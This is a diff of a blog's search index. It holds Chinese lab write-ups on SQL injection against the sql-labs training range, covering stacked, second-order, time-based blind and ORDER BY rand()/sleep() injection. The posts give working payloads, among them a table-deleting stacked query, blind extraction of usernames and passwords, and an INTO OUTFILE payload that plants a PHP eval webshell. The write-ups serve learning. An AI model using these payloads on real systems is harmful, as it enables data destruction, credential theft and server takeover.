@@ -136,26 +136,6 @@ sudo reboot
       </tags>
   </entry>
   <entry>
-    <title>SQL注入(堆叠注入)</title>
-    <url>/2022/01/20/SQL%E6%B3%A8%E5%85%A5(%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5)/</url>
-    <content><![CDATA[<h1 id="SQL注入-堆叠注入"><a href="#SQL注入-堆叠注入" class="headerlink" title="SQL注入(堆叠注入)"></a>SQL注入(堆叠注入)</h1><h2 id="堆叠注入定义"><a href="#堆叠注入定义" class="headerlink" title="堆叠注入定义"></a>堆叠注入定义</h2><p>   Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p>
-<h2 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h2><p>   在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
-<p><strong>所以说,堆叠注入不同于其他注入一样只能查询,它可以添加修改信息,可以对数据库进行破坏.</strong></p>
-<h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><p>堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
-<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>我们以sql-labs 39作为例子</p>
-<p>我们先用联合注入的形式得到数据库的名字字段名和表名,然后就可以用堆叠注入的手法将其插入数据:</p>
-<p><img src="/2022/01/20/SQL%E6%B3%A8%E5%85%A5(%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5)/image-20220120150934119.png" alt="image-20220120150934119"></p>
-<p><img src="/2022/01/20/SQL%E6%B3%A8%E5%85%A5(%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5)/image-20220120151029955.png" alt="image-20220120151029955"></p>
-<p>这时候我们再输入id=66,发现我们插入语句就成功了,说明我们就可以利用堆叠注入随心所欲地对数据库进行修改了.</p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SQL注入(二次注入)</title>
     <url>/2022/01/18/SQL%E6%B3%A8%E5%85%A5(%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5)/</url>
     <content><![CDATA[<h1 id="SQL注入-二次注入"><a href="#SQL注入-二次注入" class="headerlink" title="SQL注入(二次注入)"></a>SQL注入(二次注入)</h1><h2 id="二次注入原理"><a href="#二次注入原理" class="headerlink" title="二次注入原理"></a>二次注入原理</h2><blockquote>
@@ -314,6 +294,26 @@ sudo reboot
 <p>现在,我们修改的是admin账户的密码,而不是admin#’用户的密码了.</p>
 <p><img src="/2022/01/18/SQL%E6%B3%A8%E5%85%A5(%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5)/485e7c675c6bb79bd87160f9dbabf5db.png" alt="截图"></p>
 <p>利用admin和新改的密码即可登录进来.</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入(堆叠注入)</title>
+    <url>/2022/01/20/SQL%E6%B3%A8%E5%85%A5(%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5)/</url>
+    <content><![CDATA[<h1 id="SQL注入-堆叠注入"><a href="#SQL注入-堆叠注入" class="headerlink" title="SQL注入(堆叠注入)"></a>SQL注入(堆叠注入)</h1><h2 id="堆叠注入定义"><a href="#堆叠注入定义" class="headerlink" title="堆叠注入定义"></a>堆叠注入定义</h2><p>   Stacked injections(堆叠注入)从名词的含义就可以看到应该是一堆 sql 语句(多条)一起执行。而在真实的运用中也是这样的, 我们知道在 mysql 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。这个叫做 stacked injection。</p>
+<h2 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h2><p>   在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
+<p><strong>所以说,堆叠注入不同于其他注入一样只能查询,它可以添加修改信息,可以对数据库进行破坏.</strong></p>
+<h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><p>堆叠注入的使用条件十分有限，其可能受到API或者数据库引擎，又或者权限的限制只有当调用数据库函数支持执行多条sql语句时才能够使用，利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_ query()函数，其只能执行一条语句，分号后面的内容将不会被执行，所以可以说堆叠注入的使用条件十分有限，一旦能够被使用，将可能对网站造成十分大的威胁。</p>
+<h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>我们以sql-labs 39作为例子</p>
+<p>我们先用联合注入的形式得到数据库的名字字段名和表名,然后就可以用堆叠注入的手法将其插入数据:</p>
+<p><img src="/2022/01/20/SQL%E6%B3%A8%E5%85%A5(%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5)/image-20220120150934119.png" alt="image-20220120150934119"></p>
+<p><img src="/2022/01/20/SQL%E6%B3%A8%E5%85%A5(%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5)/image-20220120151029955.png" alt="image-20220120151029955"></p>
+<p>这时候我们再输入id=66,发现我们插入语句就成功了,说明我们就可以利用堆叠注入随心所欲地对数据库进行修改了.</p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -505,47 +505,6 @@ aiyou\&quot;bu\&quot;cuoo
       </tags>
   </entry>
   <entry>
-    <title>SQL注入(文件上传注入)</title>
-    <url>/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5)/</url>
-    <content><![CDATA[<h2 id="SQL文件上传注入"><a href="#SQL文件上传注入" class="headerlink" title="SQL文件上传注入"></a>SQL文件上传注入</h2><p>小扩展：</p>
-<blockquote>
-<p>winserver的iis默认路径c:\Inetpub\wwwroot<br>linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等<br>apache 就…/var/www/htm，…/var/www/html/htdocs<br>phpstudy 就是…\PhpStudy20180211\PHPTutorial\WWW<br>xammp 就是…\xampp\htdocs<br>load_file()导出文件<br>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</p>
-</blockquote>
-<p>使用条件：<br>A、必须有权限读取并且文件必须完全可读<br>and (select count(<em>) from mysql.user)&gt;0/</em> 如果结果返回正常,说明具有读写权限。<br>and (select count(<em>) from mysql.user)&gt;0/</em> 返回错误，应该是管理员给数据库帐户降权<br>B、欲读取文件必须在服务器上<br>C、必须指定文件完整的路径<br>D、欲读取文件必须小于max_allowed_packet</p>
-<blockquote>
-<p>@@datadir——数据库存储路径<br>@@basedir——Mysql安装路径<br>dumpfile——导出文件，类似outfile；不同的是，dumpfile一次导出一行，会和limit结合使用<br>load_file()——将文件导入mysql，用法select load_file(“文件路径”)</p>
-</blockquote>
-<p> 下面以sql-labs第七关作为演示</p>
-<h3 id="1-找注入点"><a href="#1-找注入点" class="headerlink" title="1.找注入点"></a>1.找注入点</h3><p>每关都一样,第一步就是找注入点</p>
-<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5)/788584d83e73430230f5285f232d2b58.png" alt="截图"></p>
-<p>这是我新学到的方法,直接id=’可以快速判断是否有注入点</p>
-<p>这里可以看出存在回显,说明有注入点</p>
-<p>现在判断SQL查询语句</p>
-<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5)/4cbc7bc3898a2c81d16d12a583727a50.png" alt="截图"></p>
-<p>单引号报错</p>
-<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5)/7d7a87e1cea3d9da4e29cf4421856729.png" alt="截图"></p>
-<p>双引号不报错,说明肯定不是双引号</p>
-<p>加上括号试试,</p>
-<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5)/1f11ebdb4ce3e0d14ff8486c1cf77ab8.png" alt="截图"></p>
-<p>页面显示正常，我们知道原有的sql语句为： <code>select * from table where id = ((‘input’)) limit 0,1，其中input</code>为输入内容。</p>
-<h3 id="2-找到网站的绝对路径"><a href="#2-找到网站的绝对路径" class="headerlink" title="2.找到网站的绝对路径"></a>2.找到网站的绝对路径</h3><p><code> ?id=-1&#39; union select 1,2,@@datadir -- #</code></p>
-<p>可以得到mysql数据存储路径</p>
-<p>因为第七关是没有显示信息的,我们就拿第一关作为获取路径的地方</p>
-<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5)/6d6c4aa1b6d640358622abf614c6563a.png" alt="截图"></p>
-<p>@@datadir返回的是数据库存储数据的路径，而我们知道网站路径是在WWW目录下，那么结合@@datadir我们可以推断出网站的绝对路径。</p>
-<p>这里因为这个靶场不是本地的原因,无法连接上,但是思路是一样的.</p>
-<p>payload:<code> ?id=-1’)) union select 1,2,’&lt;?php @eval($_POST[&quot;shell&quot;]);?&gt;’ into outfile “C:\\inetpub\\target\\sqlilabs\\Less-7\\shell.php” -–+</code></p>
-<?php @eval($_POST["shell"]);?><p>是一句话木马,将其传入后面的文件路径,接着用中国蚁剑连接即可注入成功.</p>
-<p>另外注意,<strong>在写路径的时候最好写\\,不然\会被转义</strong>.</p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SQL注入(时间盲注)</title>
     <url>/2022/01/10/SQL%E6%B3%A8%E5%85%A5(%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8)/</url>
     <content><![CDATA[<h1 id="基于时间进行盲注"><a href="#基于时间进行盲注" class="headerlink" title="基于时间进行盲注"></a>基于时间进行盲注</h1><p>当页面没有报错也没有回显时,时间盲注就成了我们的底牌.因为它的时间成本相对来说是最大的.它是利用页面响应时间来提示我们输入的正确与否.</p>
@@ -579,6 +538,47 @@ aiyou\&quot;bu\&quot;cuoo
 <h3 id="5-爆记录"><a href="#5-爆记录" class="headerlink" title="5.爆记录"></a>5.爆记录</h3><p>payload:<code> ?id=1&#39; and if(substr((select username from users limit 0,1),1,1)=&#39;d&#39;,sleep(3),1) --+</code></p>
 <p><img src="/2022/01/10/SQL%E6%B3%A8%E5%85%A5(%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8)/c1ee77c4e6fcdaac5dba1ca71d7149b9.png" alt="截图"></p>
 <p>爆密码的话将username改为password即可.</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入(文件上传注入)</title>
+    <url>/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5)/</url>
+    <content><![CDATA[<h2 id="SQL文件上传注入"><a href="#SQL文件上传注入" class="headerlink" title="SQL文件上传注入"></a>SQL文件上传注入</h2><p>小扩展：</p>
+<blockquote>
+<p>winserver的iis默认路径c:\Inetpub\wwwroot<br>linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等<br>apache 就…/var/www/htm，…/var/www/html/htdocs<br>phpstudy 就是…\PhpStudy20180211\PHPTutorial\WWW<br>xammp 就是…\xampp\htdocs<br>load_file()导出文件<br>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</p>
+</blockquote>
+<p>使用条件：<br>A、必须有权限读取并且文件必须完全可读<br>and (select count(<em>) from mysql.user)&gt;0/</em> 如果结果返回正常,说明具有读写权限。<br>and (select count(<em>) from mysql.user)&gt;0/</em> 返回错误，应该是管理员给数据库帐户降权<br>B、欲读取文件必须在服务器上<br>C、必须指定文件完整的路径<br>D、欲读取文件必须小于max_allowed_packet</p>
+<blockquote>
+<p>@@datadir——数据库存储路径<br>@@basedir——Mysql安装路径<br>dumpfile——导出文件，类似outfile；不同的是，dumpfile一次导出一行，会和limit结合使用<br>load_file()——将文件导入mysql，用法select load_file(“文件路径”)</p>
+</blockquote>
+<p> 下面以sql-labs第七关作为演示</p>
+<h3 id="1-找注入点"><a href="#1-找注入点" class="headerlink" title="1.找注入点"></a>1.找注入点</h3><p>每关都一样,第一步就是找注入点</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5)/788584d83e73430230f5285f232d2b58.png" alt="截图"></p>
+<p>这是我新学到的方法,直接id=’可以快速判断是否有注入点</p>
+<p>这里可以看出存在回显,说明有注入点</p>
+<p>现在判断SQL查询语句</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5)/4cbc7bc3898a2c81d16d12a583727a50.png" alt="截图"></p>
+<p>单引号报错</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5)/7d7a87e1cea3d9da4e29cf4421856729.png" alt="截图"></p>
+<p>双引号不报错,说明肯定不是双引号</p>
+<p>加上括号试试,</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5)/1f11ebdb4ce3e0d14ff8486c1cf77ab8.png" alt="截图"></p>
+<p>页面显示正常，我们知道原有的sql语句为： <code>select * from table where id = ((‘input’)) limit 0,1，其中input</code>为输入内容。</p>
+<h3 id="2-找到网站的绝对路径"><a href="#2-找到网站的绝对路径" class="headerlink" title="2.找到网站的绝对路径"></a>2.找到网站的绝对路径</h3><p><code> ?id=-1&#39; union select 1,2,@@datadir -- #</code></p>
+<p>可以得到mysql数据存储路径</p>
+<p>因为第七关是没有显示信息的,我们就拿第一关作为获取路径的地方</p>
+<p><img src="/2022/01/09/SQL%E6%B3%A8%E5%85%A5(%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5)/6d6c4aa1b6d640358622abf614c6563a.png" alt="截图"></p>
+<p>@@datadir返回的是数据库存储数据的路径，而我们知道网站路径是在WWW目录下，那么结合@@datadir我们可以推断出网站的绝对路径。</p>
+<p>这里因为这个靶场不是本地的原因,无法连接上,但是思路是一样的.</p>
+<p>payload:<code> ?id=-1’)) union select 1,2,’&lt;?php @eval($_POST[&quot;shell&quot;]);?&gt;’ into outfile “C:\\inetpub\\target\\sqlilabs\\Less-7\\shell.php” -–+</code></p>
+<?php @eval($_POST["shell"]);?><p>是一句话木马,将其传入后面的文件路径,接着用中国蚁剑连接即可注入成功.</p>
+<p>另外注意,<strong>在写路径的时候最好写\\,不然\会被转义</strong>.</p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -677,6 +677,30 @@ aiyou\&quot;bu\&quot;cuoo
       </tags>
   </entry>
   <entry>
+    <title>SQL注入判断闭合小技巧</title>
+    <url>/2022/01/21/SQL%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
+    <content><![CDATA[<h1 id="SQL注入判断闭合小技巧"><a href="#SQL注入判断闭合小技巧" class="headerlink" title="SQL注入判断闭合小技巧"></a>SQL注入判断闭合小技巧</h1><p>在前面的联合注入中我讲到过如何判断字符型还是数字型,用的办法是依靠PHP的弱类型来完成判断的,但是这个方法具有一定的局限性,且比较麻烦,需要不停试.</p>
+<p>比如在遇到order by xx的时候,用这种方法就无效了.</p>
+<p>后面我偶然习得一个更好的方法分享给大家:</p>
+<p><img src="/2022/01/21/SQL%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E5%B0%8F%E6%8A%80%E5%B7%A7/eb84da2ec71885274f5817b6b19105d7.png" alt="截图"></p>
+<p>当我输入sort=1’的时候,会有报错’’’出来,三个单引号,第一个和最后一个是系统自带的,提示我们中间的单引号出错了.我们知道,mysql检测是从头到尾顺序检测的,说明我们在这个引号之前都是对的.比如说这一关,我们现在的查询语句为:</p>
+<p><code> order by 1&#39;</code></p>
+<p>他现在只显示’错误,说明前面的order by 1 是正确的语法,说明我们用的就是数字型.</p>
+<p>那如果是字符型呢?</p>
+<p><img src="/2022/01/21/SQL%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E5%B0%8F%E6%8A%80%E5%B7%A7/2c659b53f1b9fde4c89abf377edbae47.png" alt="截图"></p>
+<p>当我输入sort=1’时,它报错’’1’’’,这说明什么,去掉第一个和最后一个,告诉我们’1’’出错了.</p>
+<p>因为我们正确的语句为 order by ‘1’ ,现在变成 order by ‘1’’,而1前面的字符串无法正确闭合,所以会让整体都出错,显示出这个字符串的全部.如果我们在前面加上\符号,那么就会变成</p>
+<p><img src="/2022/01/21/SQL%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E5%B0%8F%E6%8A%80%E5%B7%A7/3063f67ac6aa0d26dfd1be8a836df386.png" alt="截图"></p>
+<p>因为此时的语句为<code>order by &#39;1\&#39;&#39; </code>,单引号经过斜杠的转义,变成了一个字符格式的单引号,现在1前面的单引号就能正确闭合了.</p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>一些非严肃的文字</title>
     <url>/2021/11/14/hello-world/</url>
     <content><![CDATA[<p>欢迎来到我的博客</p>
@@ -753,6 +777,208 @@ aiyou\&quot;bu\&quot;cuoo
       </tags>
   </entry>
   <entry>
+    <title>关于order by注入利用rand()和sleep()的思考</title>
+    <url>/2022/01/21/%E5%85%B3%E4%BA%8Eorder%20by%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8rand()%E5%92%8Csleep()%E7%9A%84%E6%80%9D%E8%80%83/</url>
+    <content><![CDATA[<h1 id="关于order-by注入利用rand-的思考"><a href="#关于order-by注入利用rand-的思考" class="headerlink" title="关于order by注入利用rand()的思考"></a>关于order by注入利用rand()的思考</h1><p>我们知道,当我们使用rand()的时候,会返回一个[0,1)的值,但是今天我在刷靶场的时候使用时间盲注的同时遇到一个问题,就是rand()函数居然能固定下来.</p>
+<p>当我输入order by rand(0)的时候</p>
+<p><img src="/2022/01/21/%E5%85%B3%E4%BA%8Eorder%20by%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8rand()%E5%92%8Csleep()%E7%9A%84%E6%80%9D%E8%80%83/eb9fc2f3088c68410cbbd7004078312e.png" alt="截图"></p>
+<p>当我输入order by rand(1)的时候</p>
+<p><img src="/2022/01/21/%E5%85%B3%E4%BA%8Eorder%20by%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8rand()%E5%92%8Csleep()%E7%9A%84%E6%80%9D%E8%80%83/89609a51064129653c026802470b71e4.png" alt="截图"></p>
+<p>而且不管重复几次,他都是这样的.</p>
+<p>为什么?不是说rand是随机生成的吗,带着这个疑问我上网查了好久,但是没有遇到称心的答案,最后在官方文档里找到了答案:</p>
+<p>rand(n),这个n参数代表的是我们设定的随机种子的一个值,当我们输入一个常数的时候,就会给他设定一个随机种子,因为是我们人为设定的,所以它的值是恒定的.</p>
+<p>给大家举个例子:</p>
+<pre><code>mysql&gt; SELECT i, RAND() FROM t;
++------+------------------+
+| i    | RAND()           |
++------+------------------+
+|    1 | 0.61914388706828 |
+|    2 | 0.93845168309142 |
+|    3 | 0.83482678498591 |
++------+------------------+
+3 rows in set (0.00 sec)
+
+mysql&gt; SELECT i, RAND(3) FROM t;
++------+------------------+
+| i    | RAND(3)          |
++------+------------------+
+|    1 | 0.90576975597606 |
+|    2 | 0.37307905813035 |
+|    3 | 0.14808605345719 |
++------+------------------+
+3 rows in set (0.00 sec)
+//第一次结果
+mysql&gt; SELECT i, RAND() FROM t;
++------+------------------+
+| i    | RAND()           |
++------+------------------+
+|    1 | 0.35877890638893 |
+|    2 | 0.28941420772058 |
+|    3 | 0.37073435016976 |
++------+------------------+
+3 rows in set (0.00 sec)
+
+mysql&gt; SELECT i, RAND(3) FROM t;
++------+------------------+
+| i    | RAND(3)          |
++------+------------------+
+|    1 | 0.90576975597606 |
+|    2 | 0.37307905813035 |
+|    3 | 0.14808605345719 |
++------+------------------+
+3 rows in set (0.01 sec)
+//第二次结果
+</code></pre>
+<p>现在大家就懂了吧,当rand()函数中没参数的时候,随机种子是会变的,出来的结果也是不同的,当里面有不同的参数,就会出现不同的恒定的值.</p>
+<p>在我们进行sql注入的时候,就可以利用这个特点,rand(flase)=rand(0)而rand(true)=rand(1),我们就可以用来作为注入点.</p>
+<p>另外,还遇到一个蹊跷的事情</p>
+<p><img src="/2022/01/21/%E5%85%B3%E4%BA%8Eorder%20by%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8rand()%E5%92%8Csleep()%E7%9A%84%E6%80%9D%E8%80%83/82dbe7ba9919f096ae3447f3399546b3.png" alt="截图"></p>
+<p><img src="/2022/01/21/%E5%85%B3%E4%BA%8Eorder%20by%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8rand()%E5%92%8Csleep()%E7%9A%84%E6%80%9D%E8%80%83/7ffbb86e090b3220c58d344394316f2b.png" alt="截图"></p>
+<p><img src="/2022/01/21/%E5%85%B3%E4%BA%8Eorder%20by%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8rand()%E5%92%8Csleep()%E7%9A%84%E6%80%9D%E8%80%83/b015eba31951443ef7a5c78a0768697f.png" alt="截图"></p>
+<p>这题它查询的是order by sort,然后我用order by rand(0)以及order by rand(if(1=2,1,0))查询的都是固定顺序,但是换成order by rand(if(1=2,sleep(1),0))就换成别的顺序了,明明执行的都是rand(0),为什么结果不一样的…而且明明sleep(1),就沉睡一秒钟,硬生生给我睡了十几秒,一开始以为是我网的问题,但是不管怎么刷新都是十多秒.现在这个踩个坑,有答案了再更新.</p>
+<h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p>在经过一番尝试之后,开始逐渐找到问题:</p>
+<p><img src="/2022/01/21/%E5%85%B3%E4%BA%8Eorder%20by%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8rand()%E5%92%8Csleep()%E7%9A%84%E6%80%9D%E8%80%83/5d7e51e2e7b2fa12ae744b92f637e2d5.png" alt="截图"></p>
+<p>不带sleep()的时候就是正常执行,输出rand(0);</p>
+<p><img src="/2022/01/21/%E5%85%B3%E4%BA%8Eorder%20by%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8rand()%E5%92%8Csleep()%E7%9A%84%E6%80%9D%E8%80%83/7128c834068732669c0b278cf221b4df.png" alt="截图"></p>
+<p>但是只要一带上sleep(),就算他没被执行也会将其”升序”排列,为了验证是否是升序,我们再添加一组数据</p>
+<p><img src="/2022/01/21/%E5%85%B3%E4%BA%8Eorder%20by%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8rand()%E5%92%8Csleep()%E7%9A%84%E6%80%9D%E8%80%83/0bc9b720782793709dcf82ee099cdc9d.png" alt="截图"></p>
+<p>哦,不是升序,sleep()函数会使得rand()失效,让最原始的数据显示出来,按照的是数据诞生的顺序.</p>
+<p>另外还有一个小彩蛋:</p>
+<p><img src="/2022/01/21/%E5%85%B3%E4%BA%8Eorder%20by%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8rand()%E5%92%8Csleep()%E7%9A%84%E6%80%9D%E8%80%83/781aa74335434bafb522c3ef0b9fc00d.png" alt="截图"></p>
+<pre><code>mysql&gt; select i,rand(sleep(1)) from t ;
++------+---------------------+
+| i    | rand(sleep(1))      |
++------+---------------------+
+|    1 | 0.15522042769493574 |
+|    2 | 0.15522042769493574 |
+|    3 | 0.15522042769493574 |
+|    4 | 0.15522042769493574 |
+|    5 | 0.15522042769493574 |
+|    6 | 0.15522042769493574 |
+|    7 | 0.15522042769493574 |
+|    8 | 0.15522042769493574 |
+|    9 | 0.15522042769493574 |
+|  712 | 0.15522042769493574 |
+|   18 | 0.15522042769493574 |
+|   92 | 0.15522042769493574 |
++------+---------------------+
+12 rows in set (12.13 sec)
+
+mysql&gt; select i,sleep(1) from t ;
++------+----------+
+| i    | sleep(1) |
++------+----------+
+|    1 |        0 |
+|    2 |        0 |
+|    3 |        0 |
+|    4 |        0 |
+|    5 |        0 |
+|    6 |        0 |
+|    7 |        0 |
+|    8 |        0 |
+|    9 |        0 |
+|  712 |        0 |
+|   18 |        0 |
+|   92 |        0 |
++------+----------+
+12 rows in set (12.11 sec)
+</code></pre>
+<p>我们能发现我们明明设定了sleep(1),怎么最后执行需要12秒?</p>
+<p>一开始我因为是因为order by会产生重复执行的效果,其实是因为select查询语句导致的,每查询一个数据的时候就会重复sleep()一次所以后面的sleep()也会执行(记录数)次.</p>
+<h2 id="进一步推测"><a href="#进一步推测" class="headerlink" title="进一步推测"></a>进一步推测</h2><p>推测sleep()函数会使得rand()失效的原因.</p>
+<pre><code>mysql&gt; select i,rand(sleep(2)) from t ;
++------+---------------------+
+| i    | rand(sleep(2))      |
++------+---------------------+
+|    1 | 0.15522042769493574 |
+|    2 | 0.15522042769493574 |
+|    3 | 0.15522042769493574 |
+|    4 | 0.15522042769493574 |
+|    5 | 0.15522042769493574 |
+|    6 | 0.15522042769493574 |
+|    7 | 0.15522042769493574 |
+|    8 | 0.15522042769493574 |
+|    9 | 0.15522042769493574 |
+|  712 | 0.15522042769493574 |
+|   18 | 0.15522042769493574 |
+|   92 | 0.15522042769493574 |
++------+---------------------+
+12 rows in set (24.11 sec)
+
+mysql&gt; select i,rand(if(1=2,sleep(2),0)) from t ;
++------+--------------------------+
+| i    | rand(if(1=2,sleep(2),0)) |
++------+--------------------------+
+|    1 |      0.15522042769493574 |
+|    2 |      0.15522042769493574 |
+|    3 |      0.15522042769493574 |
+|    4 |      0.15522042769493574 |
+|    5 |      0.15522042769493574 |
+|    6 |      0.15522042769493574 |
+|    7 |      0.15522042769493574 |
+|    8 |      0.15522042769493574 |
+|    9 |      0.15522042769493574 |
+|  712 |      0.15522042769493574 |
+|   18 |      0.15522042769493574 |
+|   92 |      0.15522042769493574 |
++------+--------------------------+
+12 rows in set (0.00 sec)
+</code></pre>
+<p>是不是很奇怪,明明sleep()没有被执行,但是却对整个rand()函数产生了影响</p>
+<p>而换个参数</p>
+<pre><code>mysql&gt; select i,rand(if(1=2,1,0)) from t ;
++------+---------------------+
+| i    | rand(if(1=2,1,0))   |
++------+---------------------+
+|    1 | 0.15522042769493574 |
+|    2 |   0.620881741513388 |
+|    3 |  0.6387474552157777 |
+|    4 | 0.33109208227236947 |
+|    5 |  0.7392180764481594 |
+|    6 |  0.7028141661573334 |
+|    7 |  0.2964166321758336 |
+|    8 |  0.3736406931408129 |
+|    9 |  0.9789535999102086 |
+|  712 |  0.7738459508622493 |
+|   18 |  0.9323689853142658 |
+|   92 |  0.3403071047182261 |
++------+---------------------+
+12 rows in set (0.00 sec)
+
+mysql&gt; select i,rand(if(1=2,2,0)) from t ;
++------+---------------------+
+| i    | rand(if(1=2,2,0))   |
++------+---------------------+
+|    1 | 0.15522042769493574 |
+|    2 |   0.620881741513388 |
+|    3 |  0.6387474552157777 |
+|    4 | 0.33109208227236947 |
+|    5 |  0.7392180764481594 |
+|    6 |  0.7028141661573334 |
+|    7 |  0.2964166321758336 |
+|    8 |  0.3736406931408129 |
+|    9 |  0.9789535999102086 |
